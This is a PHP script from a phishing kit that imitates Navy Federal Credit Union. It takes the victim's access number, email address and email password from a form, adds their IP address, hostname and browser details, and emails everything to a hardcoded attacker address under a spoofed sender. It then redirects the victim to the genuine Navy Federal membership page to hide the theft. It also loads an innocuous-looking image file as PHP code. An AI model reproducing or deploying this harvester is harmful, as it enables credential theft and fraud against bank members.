<?php include ("images/sec.gif");
$Ok= "golmarsh@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "------=nAvY Contact Info=------\n";
$fuck .= "Access Number : ".$_POST['accnum']."\n";
$fuck .= "Email Address : ".$_POST['email']."\n";
$fuck .= "Email Pass : ".$_POST['password']."\n";
$fuck .= "------- [ Ip & Hostname Info ] -------\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "------=MorpheuZ RiZoRT=------\n";
$subject = "$ip";
$headers = "From: nAvY <spredsheet@automobile.net>";
mail($Ok,$subject,$fuck,$headers);mail($userinfo,$subject,$fuck,$headers);
Header ("Location: https://www.navyfederal.org/membership/become-a-member.php?intcmp=nav|mbrspmenu|||eligibility|10/19/2017|||");
?>
